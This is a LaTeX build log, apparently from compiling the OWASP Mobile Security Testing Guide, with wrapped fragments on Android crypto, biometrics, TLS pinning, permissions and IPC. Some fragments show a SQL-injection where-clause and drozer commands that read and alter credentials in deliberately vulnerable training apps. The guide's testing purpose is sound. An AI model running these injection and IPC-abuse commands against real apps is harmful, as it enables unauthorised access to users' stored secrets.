[]\TU/SourceSansPro(0)/m/n/10.95 exceptions \TU/SourceCodePro(6)/m/n/10.95 KeyS
toreException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 Ce
rtificateException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 NoSuchAlgorithmException 

Underfull \hbox (badness 1264) in paragraph at lines 20897--20900
[]\TU/SourceSansPro(0)/m/n/10.95 classes which uses \TU/SourceCodePro(6)/m/n/10
.95 java.security.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10
.95 javax.crypto.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 android.security.* \TU/SourceSansPro(0)/m/n/10.95 and
[369]
Overfull \hbox (17.84456pt too wide) in paragraph at lines 20965--20968
[]\TU/SourceSansPro(0)/m/n/10.95 exceptions \TU/SourceCodePro(6)/m/n/10.95 KeyS
toreException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 Ce
rtificateException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 NoSuchAlgorithmException 

Underfull \hbox (badness 1264) in paragraph at lines 20968--20971
[]\TU/SourceSansPro(0)/m/n/10.95 classes which uses \TU/SourceCodePro(6)/m/n/10
.95 java.security.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10
.95 javax.crypto.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 android.security.* \TU/SourceSansPro(0)/m/n/10.95 and
[370] [371] [372]
Underfull \hbox (badness 2781) in paragraph at lines 21148--21151
[]\TU/SourceSansPro(0)/m/n/10.95 Android Developer blog: Cryptography Changes i
n Android P - [][]$[][][][][] [] [] [] [][][][][][][] [][] [][][][][][][][][][]
 []

Underfull \hbox (badness 10000) in paragraph at lines 21179--21182
[]\TU/SourceSansPro(0)/m/n/10.95 Burpproxy its Sequencer - [][]$[][][][][] [] [
] [] [][][][][][][][][][][] [] [][][] [] [][][][] [] [][][][][][][][][][][][][]
 [] [][][][][][][] [] [][][][][] []
[373]
Underfull \hbox (badness 3118) in paragraph at lines 21205--21208
[]\TU/SourceSansPro(0)/m/n/10.95 KeyInfo Documentation - [][]$[][][][][] [] [] 
[] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][][] [] [][]
[][][][][] [] [][][][][][][][] [] [][][][][][][][] []

Overfull \hbox (10.94618pt too wide) in paragraph at lines 21208--21210
[]\TU/SourceSansPro(0)/m/n/10.95 SharedPreferences - [][]$[][][][][] [] [] [] [
][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][][] [] [][][][]
[][][] [] [][][][][][][] [] [][][][][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 21219--21222
[]\TU/SourceSansPro(0)/m/n/10.95 Android Key Attestation - [][]$[][][][][] [] [
] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][] [] [][]
[][][][][][] [] [][][][][][][][] [][] [][][] [][]

Overfull \hbox (14.96843pt too wide) in paragraph at lines 21222--21225
[]\TU/SourceSansPro(0)/m/n/10.95 Attestation and Assertion - [][]$[][][][][] []
 [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][] [][] [][] [] [][]
[][] [] [][][] [] [][][] [] [][][] [] [][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 21228--21231
[]\TU/SourceSansPro(0)/m/n/10.95 FIDO Alliance Whitepaper - [][]$[][][][][] [] 
[] [] [][][][][][][][][][][][] [] [][][] [] [][] [][] [][][][][][][] [] [][][][
][][][] [] [][][][][][][][] [][] [][][][][][] []
[374]
Underfull \hbox (badness 2359) in paragraph at lines 21303--21311
\TU/SourceSansPro(0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 setUserAuthentic
ationValidityDurationSeconds\TU/SourceSansPro(0)/m/n/10.95 ), otherwise the dev
ice needs to be
[375] [376]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/190c3e989709cec2b899e4a0ad6740fff69ed529.
png" >
Overfull \hbox (2.65039pt too wide) in paragraph at lines 21449--21451
[][]\TU/SourceSansPro(0)/m/n/10.95 {
[377]
Underfull \hbox (badness 2181) in paragraph at lines 21476--21488
[]\TU/SourceSansPro(0)/m/n/10.95 Android 6.0 (API level 23) introduced public A
PIs for authenticating users via fingerprint, but is

Underfull \hbox (badness 1454) in paragraph at lines 21476--21488
[][]\TU/SourceCodePro(6)/m/n/10.95 FingerprintManager[][] \TU/SourceSansPro(0)/
m/n/10.95 class. An app can request fingerprint authentication by instantiating
 a
[378]
Underfull \hbox (badness 5203) in paragraph at lines 21489--21500
[]\TU/SourceSansPro(0)/m/n/10.95 You can achieve better security by using the f
ingerprint API in conjunction with the Android

Overfull \hbox (27.9417pt too wide) in paragraph at lines 21489--21500
\TU/SourceSansPro(0)/m/n/10.95 created which encrypts the authentication token.
 By calling \TU/SourceCodePro(6)/m/n/10.95 setUserAuthenticationRequired(true)

Overfull \hbox (8.29257pt too wide) in paragraph at lines 21520--21525
[]\TU/SourceSansPro(0)/m/n/10.95 Android provides a library called [][]Biometri
c[][] which offers a compatibility version of the \TU/SourceCodePro(6)/m/n/10.9
5 BiometricPrompt

Underfull \hbox (badness 4132) in paragraph at lines 21542--21548
[]\TU/SourceSansPro(0)/m/n/10.95 The app creates a key in the KeyStore with \TU
/SourceCodePro(6)/m/n/10.95 setUserAuthenticationRequired \TU/SourceSansPro(0)/
m/n/10.95 and

Overfull \hbox (187.99045pt too wide) in paragraph at lines 21542--21548
\TU/SourceCodePro(6)/m/n/10.95 setInvalidatedByBiometricEnrollment \TU/SourceSa
nsPro(0)/m/n/10.95 set to true. Additionally, \TU/SourceCodePro(6)/m/n/10.95 se
tUserAuthenticationValidityDurationSeconds
[379]
Overfull \hbox (26.05118pt too wide) in paragraph at lines 21573--21580
[]\TU/SourceSansPro(0)/m/n/10.95 This section describes how to implement biomet
ric authentication by using the \TU/SourceCodePro(6)/m/n/10.95 FingerprintManag
er

Overfull \hbox (107.51051pt too wide) in paragraph at lines 21590--21596
\TU/SourceSansPro(0)/m/n/10.95 Verify the key was both created using the \TU/So
urceCodePro(6)/m/n/10.95 KeyGenerator \TU/SourceSansPro(0)/m/n/10.95 class in a
ddition to \TU/SourceCodePro(6)/m/n/10.95 setUserAuthenticationRequired(true)
[380]
Overfull \hbox (31.10501pt too wide) in paragraph at lines 21683--21687
\TU/SourceSansPro(0)/m/n/10.95 class by adding \TU/SourceCodePro(6)/m/n/10.95 s
etUserAuthenticationRequired(true) \TU/SourceSansPro(0)/m/n/10.95 in \TU/Source
CodePro(6)/m/n/10.95 KeyGenParameterSpec.Builder\TU/SourceSansPro(0)/m/n/10.95 
. 
[381]
Underfull \hbox (badness 1590) in paragraph at lines 21716--21721
[]\TU/SourceSansPro(0)/m/n/10.95 Keep in mind, a new key cannot be used immedia
tely - it has to be authenticated through the

Overfull \hbox (88.67403pt too wide) in paragraph at lines 21716--21721
\TU/SourceCodePro(6)/m/n/10.95 FingerprintManager \TU/SourceSansPro(0)/m/n/10.9
5 first. This involves wrapping the \TU/SourceCodePro(6)/m/n/10.95 Cipher \TU/S
ourceSansPro(0)/m/n/10.95 object into \TU/SourceCodePro(6)/m/n/10.95 Fingerprin
tManager.CryptoObject

Overfull \hbox (209.41478pt too wide) in paragraph at lines 21729--21733
[]\TU/SourceSansPro(0)/m/n/10.95 When the authentication succeeds, the callback
 method \TU/SourceCodePro(6)/m/n/10.95 onAuthenticationSucceeded(FingerprintMan
ager.AuthenticationResult
[382]
Underfull \hbox (badness 2229) in paragraph at lines 21772--21774
[]\TU/SourceSansPro(0)/m/n/10.95 To use the key for signing, you need to instan
tiate a CryptoObject and authenticate it through

Underfull \hbox (badness 3724) in paragraph at lines 21809--21811
[]\TU/SourceSansPro(0)/m/n/10.95 To implement authentication using symmetric fi
ngerprint authentication, use a challenge-

Underfull \hbox (badness 6575) in paragraph at lines 21817--21825
[]\TU/SourceSansPro(0)/m/n/10.95 Android 7.0 (API level 24) adds the \TU/Source
CodePro(6)/m/n/10.95 setInvalidatedByBiometricEnrollment(boolean
[383] [384]
Underfull \hbox (badness 1168) in paragraph at lines 21938--21945
[]\TU/SourceSansPro(0)/m/n/10.95 Make sure that the hostname and the certificat
e itself are verified correctly. Examples and com-

Overfull \hbox (37.4933pt too wide) in paragraph at lines 21947--21950
[]\TU/SourceSansPro(0)/m/n/10.95 Note that from Android 8.0 (API level 26) onwa
rd, there is no support for SSLv3 and \TU/SourceCodePro(6)/m/n/10.95 HttpsURLCo
nnection
[385]
Overfull \hbox (8.11008pt too wide) in paragraph at lines 21973--21979
\TU/SourceSansPro(0)/m/n/10.95 writing the functions \TU/SourceCodePro(6)/m/n/1
0.95 checkClientTrusted\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/
n/10.95 checkServerTrusted\TU/SourceSansPro(0)/m/n/10.95 , and \TU/SourceCodePr
o(6)/m/n/10.95 getAcceptedIssuers\TU/SourceSansPro(0)/m/n/10.95 .
[386] [387] [388] [389]
Underfull \hbox (badness 4467) in paragraph at lines 22221--22224
[]\TU/SourceSansPro(0)/m/n/10.95 First, find the Network Security Configuration
 file in the Android application manifest via the
[390]
Overfull \hbox (119.63937pt too wide) in paragraph at lines 22271--22271
[]\TU/SourceCodePro(6)/m/n/10.95 D/NetworkSecurityConfig: Using Network Securit
y Config from resource network_security_config[] 

Overfull \hbox (60.50938pt too wide) in paragraph at lines 22278--22278
[]\TU/SourceCodePro(6)/m/n/10.95 I/X509Util: Failed to validate the certificate
 chain, error: Pin verification failed[] 
[391] [392]
Overfull \hbox (2859.5245pt too wide) in paragraph at lines 22396--22396
[]\TU/SourceCodePro(6)/m/n/10 "3082010A02820101009CD30CF05AE52E47B7725D3783B368
6330EAD735261925E1BDBE35F170922FB7B84B4105ABA99E350858ECB12AC468870BA3E375E4E6F
3A76271BA7981601FD7919A9FF3D0786771C8690E9591CFFEE699E9603C48CC7ECA4D7712249D47
1B5AEBB9EC1E37001C9CAC7BA705EACE4AEBBD41E53698B9CBFD6D3C9668DF232A42900C867467C
87FA59AB8526114133F65E98287CBDBFA0E56F68689F3853F9786AFB0DC1AEF6B0D95167DC42BA0
65B299043675806BAC4AF31B9049782FA2964F2A20252904C674C0D031CD8F31389516BAA833B84
3F1B11FC3307FA27931133D2D36F8E3FCF2336AB93931C5AFC48D0D1D641633AAFA8429B6D40BC0
D87DC3930203010001"[];|  

Overfull \hbox (3.5245pt too wide) in paragraph at lines 22405--22405
\TU/SourceCodePro(6)/m/it/10 ning",chain.ChainElements[X].Certificate.GetPublic
KeyString());[]|  
[393] [394] [395]
Overfull \hbox (1159.88916pt too wide) in paragraph at lines 22579--22579
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -importcert -v -trustcacerts -file p
roxy.cer -alias aliascert -keystore "res/raw/truststore.bks" -provider org.boun
cycastle.jce.provider.BouncyCastleProvider -providerpath "providerpath/bcprov-j
dk15on-164.jar" -storetype BKS -storepass password[] 

Overfull \hbox (809.48923pt too wide) in paragraph at lines 22585--22585
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -list -keystore "res/raw/truststore.
bks" -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath
 "providerpath/bcprov-jdk15on-164.jar"  -storetype BKS -storepass password[] 
[396] [397]
Underfull \hbox (badness 4634) in paragraph at lines 22714--22722
\TU/SourceSansPro(0)/m/n/10.95 entry or in a parent \TU/SourceCodePro(6)/m/n/10
.95 <domain-config\>\TU/SourceSansPro(0)/m/n/10.95 , the configurations in plac
e will be based on the
[398] [399] [400] [401] [402]
Overfull \hbox (24.08975pt too wide) in paragraph at lines 22999--23004
[]\TU/SourceSansPro(0)/m/n/10.95 Use Xposed to hook into the \TU/SourceCodePro(
6)/m/n/10.95 java.security \TU/SourceSansPro(0)/m/n/10.95 package, then hook in
to \TU/SourceCodePro(6)/m/n/10.95 java.security.Security
[403]
Underfull \hbox (badness 10000) in paragraph at lines 23043--23045
[]\TU/SourceSansPro(0)/m/n/10.95 Network Security Config (cached alternative) -
 [][]$[][][][][] [] [] [] [][][][][][][][] [] [][][][][][][][][][][][][][][][][
] [] [][][] []

Underfull \hbox (badness 10000) in paragraph at lines 23043--23045
[][][][][][] [] [] [] [][][][][] [] [][][][][][][][][][][][] [] [][][][][] [] [
] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][] [] [][]
[][][][][][] [] [][][][][][][][] [][]

Underfull \hbox (badness 2237) in paragraph at lines 23054--23057
[]\TU/SourceSansPro(0)/m/n/10.95 Certificate and Public Key Pinning with Xamari
n - [][]$[][][][][] [] [] [] [][][][][][][][][][][] [] [][][] [] [][][][][][][]
[][][][] [][] [][][] [][]

Overfull \hbox (22.34132pt too wide) in paragraph at lines 23057--23059
[]\TU/SourceSansPro(0)/m/n/10.95 ServicePointManager - [][]$[][][][][] [] [] []
 [][][][] [] [][][][][][][][][] [] [][][] [] [][] [][] [][] [] [][][][][][][] [
] [][][][][][] [] [][][] [] [][][][][][][][][][][][][][][][][][][][][] []

Overfull \hbox (22.69469pt too wide) in paragraph at lines 23068--23070
[]\TU/SourceSansPro(0)/m/n/10.95 PhoneGap SSL Certificate Checker plugin - [][]
$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][][][][][][][][] [] 
[][][][][][][][][][][][][][][][][][][][][] [][]
[404] [405]
Underfull \hbox (badness 1394) in paragraph at lines 23174--23188
[]\TU/SourceSansPro(0)/bx/n/10.95 Restrictions when granting dangerous permissi
ons\TU/SourceSansPro(0)/m/n/10.95 : Dangerous permissions are classified

Underfull \hbox (badness 1968) in paragraph at lines 23190--23199
[]\TU/SourceSansPro(0)/m/n/10.95 Suppose an app lists both READ_EXTERNAL_STORAG
E and WRITE_EXTERNAL_STORAGE

Underfull \hbox (badness 1715) in paragraph at lines 23190--23199
\TU/SourceSansPro(0)/m/n/10.95 at the same time, because it belongs to the same
 STORAGE permission group and is

Underfull \hbox (badness 1097) in paragraph at lines 23190--23199
\TU/SourceSansPro(0)/m/n/10.95 grants only READ_EXTERNAL_STORAGE at that time; 
however, if the app later requests

Overfull \hbox (45.5809pt too wide) in paragraph at lines 23224--23231
[]\TU/SourceSansPro(0)/bx/n/10.95 Restricted access to call logs\TU/SourceSansP
ro(0)/m/n/10.95 : \TU/SourceCodePro(6)/m/n/10.95 READ_CALL_LOG\TU/SourceSansPro
(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 WRITE_CALL_LOG\TU/SourceSansPro(
0)/m/n/10.95 , and \TU/SourceCodePro(6)/m/n/10.95 PROCESS_OUTGOING_CALLS
[406]
Underfull \hbox (badness 1303) in paragraph at lines 23307--23314
\TU/SourceSansPro(0)/m/n/10.95 ifest restrict who can start or bind to the asso
ciated Service. The permission is checked during
[407]
Underfull \hbox (badness 3803) in paragraph at lines 23355--23362
\TU/SourceCodePro(6)/m/n/10.95 ContentResolver.insert\TU/SourceSansPro(0)/m/n/1
0.95 , \TU/SourceCodePro(6)/m/n/10.95 ContentResolver.update\TU/SourceSansPro(0
)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 ContentResolver.delete \TU/SourceS
ansPro(0)/m/n/10.95 re-

Overfull \hbox (72.93692pt too wide) in paragraph at lines 23373--23379
\TU/SourceSansPro(0)/m/n/10.95 set \TU/SourceCodePro(6)/m/n/10.95 Intent.FLAG_G
RANT_READ_URI_PERMISSION \TU/SourceSansPro(0)/m/n/10.95 and/or \TU/SourceCodePr
o(6)/m/n/10.95 Intent.FLAG_GRANT_WRITE_URI_PERMISSION\TU/SourceSansPro(0)/m/n/1
0.95 .
[408]
Underfull \hbox (badness 3439) in paragraph at lines 23406--23413
[]\TU/SourceSansPro(0)/m/n/10.95 Android allows apps to expose their services/c
omponents to other apps. Custom permissions

Underfull \hbox (badness 1308) in paragraph at lines 23406--23413
\TU/SourceSansPro(0)/m/n/10.95 are required for app access to the exposed compo
nents. You can define [][]custom permissions[][] in

Overfull \hbox (4.86523pt too wide) in paragraph at lines 23406--23413
\TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml \TU/SourceSansPro(0)/m/n/10.
95 by creating a permission tag with two mandatory attributes: \TU/SourceCodePr
o(6)/m/n/10.95 android:name
[409]
Underfull \hbox (badness 3701) in paragraph at lines 23450--23462
[]\TU/SourceSansPro(0)/m/n/10.95 Once the permission \TU/SourceCodePro(6)/m/n/1
0.95 START_MAIN_ACTIVITY \TU/SourceSansPro(0)/m/n/10.95 has been created, apps 
can request it via the

Underfull \hbox (badness 1371) in paragraph at lines 23450--23462
\TU/SourceCodePro(6)/m/n/10.95 uses-permission \TU/SourceSansPro(0)/m/n/10.95 t
ag in the \TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml \TU/SourceSansPro(
0)/m/n/10.95 file. Any application granted the cus-

Underfull \hbox (badness 3769) in paragraph at lines 23450--23462
\TU/SourceSansPro(0)/m/n/10.95 tom permission \TU/SourceCodePro(6)/m/n/10.95 ST
ART_MAIN_ACTIVITY \TU/SourceSansPro(0)/m/n/10.95 can then launch the \TU/Source
CodePro(6)/m/n/10.95 TEST_ACTIVITY\TU/SourceSansPro(0)/m/n/10.95 . Please note
[410] [411]
Underfull \hbox (badness 1859) in paragraph at lines 23577--23585
\TU/SourceSansPro(0)/m/n/10.95 missions programmatically. This is not recommend
ed, however, because it is more error-prone
[412] [413] [414] [415]
Overfull \hbox (56.13431pt too wide) in paragraph at lines 23763--23767
\TU/SourceSansPro(0)/m/n/10.95 essary for the app. For instance: a single-playe
r game that requires access to \TU/SourceCodePro(6)/m/n/10.95 android.permissio
n.WRITE_SMS\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (3.5245pt too wide) in paragraph at lines 23821--23821
\TU/SourceCodePro(6)/m/n/10 droid:name=[][]".OMTG_CODING_003_SQL_Injection_Cont
ent_Provider_Implementation"[]|  
[416]
Overfull \hbox (160.94403pt too wide) in paragraph at lines 23827--23832
\TU/SourceSansPro(0)/m/n/10.95 to all other apps. The \TU/SourceCodePro(6)/m/n/
10.95 query \TU/SourceSansPro(0)/m/n/10.95 function in the \TU/SourceCodePro(6)
/m/n/10.95 OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation.java
[417]
Overfull \hbox (82.99635pt too wide) in paragraph at lines 23872--23880
[]\TU/SourceSansPro(0)/m/n/10.95 While the user is providing a STUDENT_ID at \T
U/SourceCodePro(6)/m/n/10.95 content://sg.vp.owasp_mobile.provider.College/stud
ents\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (21.0894pt too wide) in paragraph at lines 23925--23925
[]\TU/SourceCodePro(6)/m/n/10.95 # content query --uri content://sg.vp.owasp_mo
bile.provider.College/students[] 

Overfull \hbox (229.1393pt too wide) in paragraph at lines 23932--23932
[]\TU/SourceCodePro(6)/m/n/10.95 # content query --uri content://sg.vp.owasp_mo
bile.provider.College/students --where "name=[]Bob[]) OR 1=1--[][]"[] 
[418]
Overfull \hbox (271.57433pt too wide) in paragraph at lines 23948--23954
[]\TU/SourceSansPro(0)/m/n/10.95 This abstract class parses the extra data fiel
ds of an Intent, in particular, the \TU/SourceCodePro(6)/m/n/10.95 PreferenceAc
tivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment)

Overfull \hbox (88.31508pt too wide) in paragraph at lines 23948--23954
\TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 PreferenceAct
ivity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)
[419] [420]
Overfull \hbox (64.52951pt too wide) in paragraph at lines 24076--24076
| | | |\TU/SourceCodePro(6)/m/n/10 i.[]setClassName[]([]"pt.claudio.insecurefra
gment"[],[]"pt.claudio.insecurefragment.MainActivity"[]);|  

Overfull \hbox (187.09499pt too wide) in paragraph at lines 24102--24107
[]\TU/SourceSansPro(0)/m/n/10.95 Consider this contrived example: \TU/SourceCod
ePro(6)/m/n/10.95 sms://compose/to=your.boss@company.com&message=I%20QUIT!&send
Immediately=true\TU/SourceSansPro(0)/m/n/10.95 .

Underfull \hbox (badness 1072) in paragraph at lines 24122--24131
\TU/SourceSansPro(0)/m/n/10.95 mobile app via a link, which isn’t inherently ri
sky. Alternatively, since Android 6.0 (API level 23)
[421]
Underfull \hbox (badness 3907) in paragraph at lines 24175--24179
[]\TU/SourceSansPro(0)/m/n/10.95 Data can then be transmitted through this new 
scheme with, for example, the following URI:

Underfull \hbox (badness 10000) in paragraph at lines 24175--24179
\TU/SourceCodePro(6)/m/n/10.95 myapp://path/to/what/i/want?keyOne=valueOne&keyT
wo=valueTwo\TU/SourceSansPro(0)/m/n/10.95 . Code like
[422]
Overfull \hbox (47.36942pt too wide) in paragraph at lines 24209--24209
[]    \TU/SourceCodePro(6)/m/n/10.95 com.google.android.apps.messaging.ui.conve
rsation.LaunchConversationActivity[] 

Overfull \hbox (126.2094pt too wide) in paragraph at lines 24216--24216
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.activity.start  --action android.i
ntent.action.VIEW --data-uri "sms://0123456789"[] 
[423]
Overfull \hbox (32.0394pt too wide) in paragraph at lines 24312--24312
[]\TU/SourceCodePro(6)/m/n/10.95 $ cd path/to/android/sdk/tools/bin && ./sdkman
ager []extras;google;instantapps[][] 

Underfull \hbox (badness 1383) in paragraph at lines 24314--24317
[]\TU/SourceSansPro(0)/m/n/10.95 Next, you have to add \TU/SourceCodePro(6)/m/n
/10.95 path/to/android/sdk/extras/google/instantapps/ia \TU/SourceSansPro(0)/m/
n/10.95 to your
[424]
Underfull \hbox (badness 1394) in paragraph at lines 24420--24433
\TU/SourceSansPro(0)/m/n/10.95 ways to designate a component as exported. The o
bvious one is setting the export tag to true
[425] [426]
Overfull \hbox (147.5245pt too wide) in paragraph at lines 24535--24535
\TU/SourceCodePro(6)/m/n/10 vice.[]this[].[]setKey[](returnBundle.[]getString[]
([]"com.mwr.example.sieve.PASSWORD"[]))) 
[427]
Overfull \hbox (117.5245pt too wide) in paragraph at lines 24542--24542
\TU/SourceCodePro(6)/m/n/10 vice.[]this[].[]setPin[](returnBundle.[]getString[]
([]"com.mwr.example.sieve.PIN"[]))) 

Underfull \hbox (badness 1888) in paragraph at lines 24563--24565
[]\TU/SourceSansPro(0)/m/n/10.95 In the “Android Insecure Bank” app, we find a 
broadcast receiver in the manifest, identified by

Underfull \hbox (badness 10000) in paragraph at lines 24579--24582
[]\TU/SourceSansPro(0)/m/n/10.95 Search the source code for strings like \TU/So
urceCodePro(6)/m/n/10.95 sendBroadcast\TU/SourceSansPro(0)/m/n/10.95 , \TU/Sour
ceCodePro(6)/m/n/10.95 sendOrderedBroadcast\TU/SourceSansPro(0)/m/n/10.95 , and

[428]
Underfull \hbox (badness 1546) in paragraph at lines 24588--24593
\TU/SourceSansPro(0)/m/n/10.95 analysis and search for usage of the class \TU/S
ourceCodePro(6)/m/n/10.95 android.content.BroadcastReceiver \TU/SourceSansPro(0
)/m/n/10.95 and the
[429] [430]
Overfull \hbox (56.1294pt too wide) in paragraph at lines 24686--24686
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Keys[] 

Overfull \hbox (923.36919pt too wide) in paragraph at lines 24686--24686
[]\TU/SourceCodePro(6)/m/n/10.95 Permission Denial: reading com.mwr.example.sie
ve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys
 from pid=4268, uid=10054 requires com.mwr.example.sieve.READ_KEYS, or grantUri
Permission()[] 

Overfull \hbox (62.6994pt too wide) in paragraph at lines 24692--24692
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Keys/[] 

Overfull \hbox (419.66931pt too wide) in paragraph at lines 24701--24701
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.update content://com.mwr.
example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string Password 
"newpassword"[] 

Overfull \hbox (62.6994pt too wide) in paragraph at lines 24701--24701
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Keys/[] 

Overfull \hbox (119.00435pt too wide) in paragraph at lines 24721--24725
[]\TU/SourceSansPro(0)/m/n/10.95 Enumerating activities in the vulnerable passw
ord manager “Sieve” shows that the activity \TU/SourceCodePro(6)/m/n/10.95 com.
mwr.example.sieve.PWList

Overfull \hbox (104.30939pt too wide) in paragraph at lines 24728--24728
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.activity.start --component com.mwr
.example.sieve com.mwr.example.sieve.PWList[] 
[431]
Overfull \hbox (678.08928pt too wide) in paragraph at lines 24763--24763
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.service.send com.mwr.example.sieve
 com.mwr.example.sieve.AuthService --msg 6345 7452 1 --extra string com.mwr.exa
mple.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj[] 

Overfull \hbox (1.3794pt too wide) in paragraph at lines 24763--24763
[]\TU/SourceCodePro(6)/m/n/10.95 Got a reply from com.mwr.example.sieve/com.mwr
.example.sieve.AuthService:[] 
[432]
Overfull \hbox (270.74934pt too wide) in paragraph at lines 24791--24791
[]\TU/SourceCodePro(6)/m/n/10.95 dz>  run app.broadcast.send --action theBroadc
ast --extra string phonenumber 07123456789 --extra string newpass 12345[] 
[433]
Underfull \hbox (badness 3128) in paragraph at lines 24884--24887
[]\TU/SourceSansPro(0)/m/n/10.95 To remove all JavaScript source code and local
ly stored data, clear the WebView’s cache with
[434]
Underfull \hbox (badness 1939) in paragraph at lines 24983--24991
[]\TU/SourceCodePro(6)/m/n/10.95 setAllowFileAccess\TU/SourceSansPro(0)/m/n/10.
95 : Enables and disables file access within a WebView. File access

Underfull \hbox (badness 2781) in paragraph at lines 24983--24991
\TU/SourceSansPro(0)/m/n/10.95 is enabled by default. Note that this enables an
d disables [][]file system access[][] only. As-

Underfull \hbox (badness 2142) in paragraph at lines 24983--24991
\TU/SourceSansPro(0)/m/n/10.95 set and resource access is unaffected and access
ible via \TU/SourceCodePro(6)/m/n/10.95 file:///android_asset \TU/SourceSansPro
(0)/m/n/10.95 and
[435] [436] [437] [438] [439]
Underfull \hbox (badness 2035) in paragraph at lines 25261--25280
[]\TU/SourceSansPro(0)/m/n/10.95 There are several ways to serialize the conten
ts of an object to JSON. Android comes with the
[440] [441] [442]
Overfull \hbox (6.48947pt too wide) in paragraph at lines 25433--25439
[]\TU/SourceSansPro(0)/m/n/10.95 Make sure that sensitive data has been encrypt
ed and HMACed/signed after serialization/persistence.
[443]
Underfull \hbox (badness 1983) in paragraph at lines 25573--25576
[]\TU/SourceSansPro(0)/m/n/10.95 In the AndroidManifest, there will be \TU/Sour
ceCodePro(6)/m/n/10.95 meta-data \TU/SourceSansPro(0)/m/n/10.95 entries with va
lues such as \TU/SourceCodePro(6)/m/n/10.95 DATABASE\TU/SourceSansPro(0)/m/n/10
.95 ,
[444] [445] [446] [447]
Overfull \hbox (1.35373pt too wide) in paragraph at lines 25810--25811
[][][]$[][][][][] [] [] [] [][][][][][][][][][][][][][][][][][][][] [] [][][] [
] [][] [][] [][][][][][][] [] [][][][][][][] [] [][][][] [] [][] [] [][][][][][
][] [][] [][][][][][][][][] [][] [][][][] [][] [][][][][][][][][] []

Overfull \hbox (7.87286pt too wide) in paragraph at lines 25828--25830
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][
][][][][][][][][][][][][][][][][][][][][][][][][] []

Overfull \hbox (3.53665pt too wide) in paragraph at lines 25830--25832
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][
][][][][][][][][][][][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 25832--25834
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][] [] [][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][][][
][] [] [][][][][][][][][][] [] [][][][] []
[448]
Underfull \hbox (badness 10000) in paragraph at lines 25846--25848
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][] [] [][][][][][] [][] [][][][] [][] [][][][][][][] [] [][][][][][][] []
[] [][][][][][][] [] [][][][][][][] [][] [][][][][][][] [][] [][][] [][]
[449]
Overfull \hbox (73.06233pt too wide) in paragraph at lines 25981--25983
[]\TU/SourceSansPro(0)/m/n/10.95 APK signatures can be verified with the \TU/So
urceCodePro(6)/m/n/10.95 apksigner \TU/SourceSansPro(0)/m/n/10.95 tool. It is l
ocated at \TU/SourceCodePro(6)/m/n/10.95 [SDK-Path]/build-tools/[version]\TU/So
urceSansPro(0)/m/n/10.95 . 
[450]
Overfull \hbox (25.46947pt too wide) in paragraph at lines 26008--26008
[]      \TU/SourceCodePro(6)/m/n/10.95 [CertPath not validated: Path doesn\[]t 
chain with any of the trust anchors][] 
[451]
Underfull \hbox (badness 3826) in paragraph at lines 26069--26072
[]\TU/SourceSansPro(0)/m/n/10.95 Drozer can be used to determine whether an app
lication is debuggable. The Drozer module

Underfull \hbox (badness 2401) in paragraph at lines 26069--26072
